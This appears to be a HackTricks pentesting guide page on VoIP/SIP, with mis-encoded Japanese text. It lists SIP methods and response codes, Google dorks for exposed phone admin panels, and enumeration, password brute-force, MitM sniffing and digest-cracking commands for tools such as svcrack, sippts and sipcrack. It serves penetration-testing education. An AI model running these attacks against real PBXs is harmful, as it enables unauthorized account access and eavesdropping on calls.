# Pentesting VoIP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## VoIP åŸºæœ¬æƒ…å ±

VoIPã®ä»•çµ„ã¿ã«ã¤ã„ã¦å­¦ã¶ã«ã¯ã€ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## åŸºæœ¬ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚³ãƒ¼ãƒ‰

**1xxâ€”æš«å®šãƒ¬ã‚¹ãƒãƒ³ã‚¹**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxâ€”æˆåŠŸã—ãŸãƒ¬ã‚¹ãƒãƒ³ã‚¹**
```
200 OK
202 Accepted
204 No Notification
```
**3xxâ€”ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ãƒ¬ã‚¹ãƒãƒ³ã‚¹**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxâ€”ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚¨ãƒ©ãƒ¼å¿œç­”**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxâ€”ã‚µãƒ¼ãƒãƒ¼éšœå®³å¿œç­”**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxâ€”ã‚°ãƒ­ãƒ¼ãƒãƒ«å¤±æ•—å¿œç­”**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Telephone Numbers

Red TeamãŒæœ€åˆã«è¡Œã†ã¹ãã‚¹ãƒ†ãƒƒãƒ—ã®ä¸€ã¤ã¯ã€OSINTãƒ„ãƒ¼ãƒ«ã€Googleæ¤œç´¢ã€ã¾ãŸã¯ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã®ã‚¹ã‚¯ãƒ¬ã‚¤ãƒ”ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ã¦ã€ä¼šç¤¾ã«é€£çµ¡ã™ã‚‹ãŸã‚ã®åˆ©ç”¨å¯èƒ½ãªé›»è©±ç•ªå·ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã§ã™ã€‚

é›»è©±ç•ªå·ãŒã‚ã‹ã£ãŸã‚‰ã€ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä½¿ç”¨ã—ã¦ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ã‚’ç‰¹å®šã§ãã¾ã™ï¼š

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ãŒVoIPã‚µãƒ¼ãƒ“ã‚¹ã‚’æä¾›ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’çŸ¥ã‚‹ã“ã¨ã§ã€ä¼šç¤¾ãŒVoIPã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç‰¹å®šã§ãã¾ã™... ã•ã‚‰ã«ã€ä¼šç¤¾ãŒVoIPã‚µãƒ¼ãƒ“ã‚¹ã‚’å¥‘ç´„ã—ã¦ã„ãªã„ãŒã€PSTNã‚«ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ç‹¬è‡ªã®VoIP PBXã‚’å¾“æ¥ã®é›»è©±ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«æ¥ç¶šã—ã¦ã„ã‚‹å¯èƒ½æ€§ã‚‚ã‚ã‚Šã¾ã™ã€‚

éŸ³æ¥½ã®è‡ªå‹•å¿œç­”ãªã©ã¯ã€é€šå¸¸VoIPãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINTæƒ…å ±

VoIPã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚’ç‰¹å®šã™ã‚‹ã®ã«å½¹ç«‹ã¤ä»–ã®OSINTåˆ—æŒ™ã¯ã€Red Teamã«ã¨ã£ã¦æœ‰ç›Šã§ã™ã€‚

### ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åˆ—æŒ™

* **`nmap`** ã¯UDPã‚µãƒ¼ãƒ“ã‚¹ã®ã‚¹ã‚­ãƒ£ãƒ³ãŒå¯èƒ½ã§ã™ãŒã€ã‚¹ã‚­ãƒ£ãƒ³ã•ã‚Œã‚‹UDPã‚µãƒ¼ãƒ“ã‚¹ã®æ•°ãŒå¤šã„ãŸã‚ã€éå¸¸ã«é…ãã€ã“ã®ç¨®ã®ã‚µãƒ¼ãƒ“ã‚¹ã«å¯¾ã—ã¦ã‚ã¾ã‚Šæ­£ç¢ºã§ã¯ãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** from SIPVicious (`sudo apt install sipvicious`): æŒ‡å®šã•ã‚ŒãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®SIPã‚µãƒ¼ãƒ“ã‚¹ã‚’ç‰¹å®šã—ã¾ã™ã€‚
* `svmap`ã¯**ç°¡å˜ã«ãƒ–ãƒ­ãƒƒã‚¯**ã§ãã¾ã™ã€‚ãªãœãªã‚‰ã€User-Agent `friendly-scanner`ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ãŒã€`/usr/share/sipvicious/sipvicious`ã®ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã—ã¦å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTSã‚¹ã‚­ãƒ£ãƒ³ã¯ã€UDPã€TCPã€ã¾ãŸã¯TLSä¸Šã®SIPã‚µãƒ¼ãƒ“ã‚¹ç”¨ã®éå¸¸ã«é«˜é€Ÿãªã‚¹ã‚­ãƒ£ãƒŠãƒ¼ã§ã™ã€‚ãƒãƒ«ãƒã‚¹ãƒ¬ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€å¤§è¦æ¨¡ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ç¯„å›²ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã§ãã¾ã™ã€‚ãƒãƒ¼ãƒˆç¯„å›²ã‚’ç°¡å˜ã«æŒ‡å®šã—ã€TCPã¨UDPã®ä¸¡æ–¹ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã€åˆ¥ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯OPTIONSã‚’ä½¿ç”¨ï¼‰ã€ç•°ãªã‚‹User-Agentã‚’æŒ‡å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãã®ä»–ã‚‚å«ã‚€ï¼‰ã€‚
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Extra Network Enumeration

PBXã¯ã€ä»–ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã‚‚å…¬é–‹ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š

* **69/UDP (TFTP)**: ãƒ•ã‚¡ãƒ¼ãƒ ã‚¦ã‚§ã‚¢ã®æ›´æ–°
* **80 (HTTP) / 443 (HTTPS)**: ã‚¦ã‚§ãƒ–ã‹ã‚‰ãƒ‡ãƒã‚¤ã‚¹ã‚’ç®¡ç†ã™ã‚‹ãŸã‚
* **389 (LDAP)**: ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã‚’ä¿å­˜ã™ã‚‹ãŸã‚ã®ä»£æ›¿æ‰‹æ®µ
* **3306 (MySQL)**: MySQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹
* **5038 (Manager)**: ä»–ã®ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‹ã‚‰Asteriskã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’è¨±å¯
* **5222 (XMPP)**: Jabberã‚’ä½¿ç”¨ã—ãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸
* **5432 (PostgreSQL)**: PostgreSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹
* ãã®ä»–...

### Methods Enumeration

`SIPPTS enumerate`ã‚’ä½¿ç”¨ã—ã¦PBXã§**ä½¿ç”¨å¯èƒ½ãªãƒ¡ã‚½ãƒƒãƒ‰**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚[**sippts**](https://github.com/Pepelux/sippts)ã‹ã‚‰
```bash
sippts enumerate -i 10.10.0.10
```
### ã‚µãƒ¼ãƒãƒ¼ã®å¿œç­”ã®åˆ†æ

ã‚µãƒ¼ãƒãƒ¼ãŒç§ãŸã¡ã«è¿”ã™ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’åˆ†æã™ã‚‹ã“ã¨ã¯éå¸¸ã«é‡è¦ã§ã™ã€‚ã“ã‚Œã¯ã€ç§ãŸã¡ãŒé€ä¿¡ã™ã‚‹ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®ç¨®é¡ã‚„ãƒ˜ãƒƒãƒ€ãƒ¼ã«ã‚ˆã£ã¦ç•°ãªã‚Šã¾ã™ã€‚ [**sippts**](https://github.com/Pepelux/sippts) ã® `SIPPTS send` ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã™ã¹ã¦ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’æ“ä½œã—ã¦ãƒ‘ãƒ¼ã‚½ãƒŠãƒ©ã‚¤ã‚ºã•ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã€å¿œç­”ã‚’åˆ†æã§ãã¾ã™ã€‚
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
ã‚µãƒ¼ãƒãƒ¼ãŒã‚¦ã‚§ãƒ–ã‚½ã‚±ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚[**sippts**](https://github.com/Pepelux/sippts)ã®`SIPPTS wssend`ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒ‘ãƒ¼ã‚½ãƒŠãƒ©ã‚¤ã‚ºã•ã‚ŒãŸWSãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã§ãã¾ã™ã€‚
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

PBXï¼ˆãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆãƒ–ãƒ©ãƒ³ãƒäº¤æ›ï¼‰ã‚·ã‚¹ãƒ†ãƒ ã«ãŠã‘ã‚‹æ‹¡å¼µã¯ã€**çµ„ç¹”ã‚„ãƒ“ã‚¸ãƒã‚¹å†…ã®å€‹ã€…ã®**é›»è©±å›ç·šã€ãƒ‡ãƒã‚¤ã‚¹ã€ã¾ãŸã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸ**ãƒ¦ãƒ‹ãƒ¼ã‚¯ãªå†…éƒ¨è­˜åˆ¥å­**ã‚’æŒ‡ã—ã¾ã™ã€‚æ‹¡å¼µã¯ã€**å„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ãƒ‡ãƒã‚¤ã‚¹ã®ãŸã‚ã«å€‹åˆ¥ã®å¤–éƒ¨é›»è©±ç•ªå·ã‚’å¿…è¦ã¨ã›ãšã«ã€çµ„ç¹”å†…ã§åŠ¹ç‡çš„ã«é€šè©±ã‚’ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã™ã‚‹**ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

* **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar`ã¯ç„¡æ–™ã®SIP PBXæ‹¡å¼µãƒ©ã‚¤ãƒ³ã‚¹ã‚­ãƒ£ãƒŠãƒ¼ã§ã™ã€‚æ¦‚å¿µçš„ã«ã¯ã€**æ‹¡å¼µã®ç¯„å›²ã‚„æŒ‡å®šã•ã‚ŒãŸæ‹¡å¼µã®ãƒªã‚¹ãƒˆã‚’æ¨æ¸¬ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ã€å¾“æ¥ã®ã‚¦ã‚©ãƒ¼ãƒ‰ãƒ©ã‚¤ãƒ©ãƒ¼ã¨åŒæ§˜ã«æ©Ÿèƒ½ã—ã¾ã™**ã€‚
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS extenã¯SIPã‚µãƒ¼ãƒãƒ¼ä¸Šã®æ‹¡å¼µã‚’ç‰¹å®šã—ã¾ã™ã€‚Sipextenã¯å¤§è¦æ¨¡ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¨ãƒãƒ¼ãƒˆç¯„å›²ã‚’ãƒã‚§ãƒƒã‚¯ã§ãã¾ã™ã€‚
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: metasploitã‚’ä½¿ç”¨ã—ã¦æ‹¡å¼µæ©Ÿèƒ½/ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** ã¯ã‚¤ãƒ³ã‚¿ãƒ¼ã‚¢ã‚¹ã‚¿ãƒªã‚¹ã‚¯äº¤æ›ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã® **ãƒ¦ãƒ¼ã‚¶ãƒ¼åãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹åˆ—æŒ™ãƒ„ãƒ¼ãƒ«** ã§ã™ã€‚enumIAX ã¯ã€2ã¤ã®ç•°ãªã‚‹ãƒ¢ãƒ¼ãƒ‰ã§å‹•ä½œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚·ãƒ¼ã‚±ãƒ³ã‚·ãƒ£ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼åæ¨æ¸¬ã¾ãŸã¯è¾æ›¸æ”»æ’ƒã€‚
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIPæ”»æ’ƒ

### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ - ã‚ªãƒ³ãƒ©ã‚¤ãƒ³

**PBX**ã¨ã„ãã¤ã‹ã®**æ‹¡å¼µ/ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã‚’ç™ºè¦‹ã—ãŸå ´åˆã€Red Teamã¯ä¸€èˆ¬çš„ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®è¾æ›¸ã‚’ä½¿ç”¨ã—ã¦ã€æ‹¡å¼µã«å¯¾ã—ã¦**`REGISTER`ãƒ¡ã‚½ãƒƒãƒ‰**ã‚’ä»‹ã—ã¦**èªè¨¼ã‚’è©¦ã¿ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="danger" %}
**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã¯æ‹¡å¼µã¨åŒã˜ã§ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ãŒã€ã“ã®æ…£è¡Œã¯PBXã‚·ã‚¹ãƒ†ãƒ ã€ãã®è¨­å®šã€ãŠã‚ˆã³çµ„ç¹”ã®å¥½ã¿ã«ã‚ˆã£ã¦ç•°ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™...

ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒæ‹¡å¼µã¨ç•°ãªã‚‹å ´åˆã¯ã€**ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãŸã‚ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ç‰¹å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚
{% endhint %}

* **`svcrack`** from SIPVicious (`sudo apt install sipvicious`): SVCrackã¯ã€PBXä¸Šã®ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼å/æ‹¡å¼µã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrackã¯ã€SIPã‚µãƒ¼ãƒ“ã‚¹ç”¨ã®ãƒªãƒ¢ãƒ¼ãƒˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚¯ãƒ©ãƒƒã‚«ãƒ¼ã§ã™ã€‚Rcrackã¯ã€ç•°ãªã‚‹IPãŠã‚ˆã³ãƒãƒ¼ãƒˆç¯„å›²ã§è¤‡æ•°ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒ†ã‚¹ãƒˆã§ãã¾ã™ã€‚
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIPã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

**ã‚ªãƒ¼ãƒ—ãƒ³Wifiãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯**å†…ã«VoIPæ©Ÿå™¨ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€**ã™ã¹ã¦ã®æƒ…å ±ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã•ã‚‰ã«ã€ã‚ˆã‚Šé–‰ã˜ãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ï¼ˆEthernetçµŒç”±ã¾ãŸã¯ä¿è­·ã•ã‚ŒãŸWifiã«æ¥ç¶šï¼‰å†…ã«ã„ã‚‹å ´åˆã€**PBXã¨ã‚²ãƒ¼ãƒˆã‚¦ã‚§ã‚¤**ã®é–“ã§**MitMæ”»æ’ƒ**ï¼ˆä¾‹ãˆã°ã€[**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)ï¼‰ã‚’å®Ÿè¡Œã—ã¦æƒ…å ±ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æƒ…å ±ã®ä¸­ã«ã¯ã€æ©Ÿå™¨ã‚’ç®¡ç†ã™ã‚‹ãŸã‚ã®**ã‚¦ã‚§ãƒ–èªè¨¼æƒ…å ±**ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**å†…ç·šç•ªå·**ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã€**IP**ã‚¢ãƒ‰ãƒ¬ã‚¹ã€ã•ã‚‰ã«ã¯**ãƒãƒƒã‚·ãƒ¥åŒ–ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚„**RTPãƒ‘ã‚±ãƒƒãƒˆ**ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ã“ã‚Œã‚’å†ç”Ÿã—ã¦**ä¼šè©±ã‚’èã**ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€Wiresharkã‚„tcpdumpãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã§ãã¾ã™ãŒã€**VoIPä¼šè©±ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹ãŸã‚ã«ç‰¹åˆ¥ã«ä½œæˆã•ã‚ŒãŸãƒ„ãƒ¼ãƒ«ã¯**[**ucsniff**](https://github.com/Seabreg/ucsniff)ã§ã™ã€‚

{% hint style="danger" %}
**SIPé€šä¿¡ã«TLSãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹**å ´åˆã€SIPé€šä¿¡ã‚’ã‚¯ãƒªã‚¢ã§è¦‹ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚\
**SRTP**ã‚„**ZRTP**ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã‚‚åŒæ§˜ã§ã€**RTPãƒ‘ã‚±ãƒƒãƒˆã¯ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆã§ã¯ã‚ã‚Šã¾ã›ã‚“**ã€‚
{% endhint %}

#### SIPèªè¨¼æƒ…å ±ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ - ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ï¼‰

[**SIP REGISTERé€šä¿¡**ã‚’ã‚ˆã‚Šã‚ˆãç†è§£ã™ã‚‹ãŸã‚ã®ã“ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) **èªè¨¼æƒ…å ±ãŒã©ã®ã‚ˆã†ã«é€ä¿¡ã•ã‚Œã‚‹ã‹**ã‚’å­¦ã¶ãŸã‚ã«ã€‚

* **`sipdump`** & **`sipcrack`,** **sipcrack**ã®ä¸€éƒ¨ï¼ˆ`apt-get install sipcrack`ï¼‰ï¼šã“ã‚Œã‚‰ã®ãƒ„ãƒ¼ãƒ«ã¯ã€SIPãƒ—ãƒ­ãƒˆã‚³ãƒ«å†…ã®**ãƒ€ã‚¤ã‚¸ã‚§ã‚¹ãƒˆèªè¨¼**ã‚’**æŠ½å‡º**ã—ã€**ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTSãƒ€ãƒ³ãƒ—ã¯ã€pcapãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ãƒ€ã‚¤ã‚¸ã‚§ã‚¹ãƒˆèªè¨¼ã‚’æŠ½å‡ºã§ãã¾ã™ã€‚
```bash
sippts dump -f capture.pcap -o data.txt
```
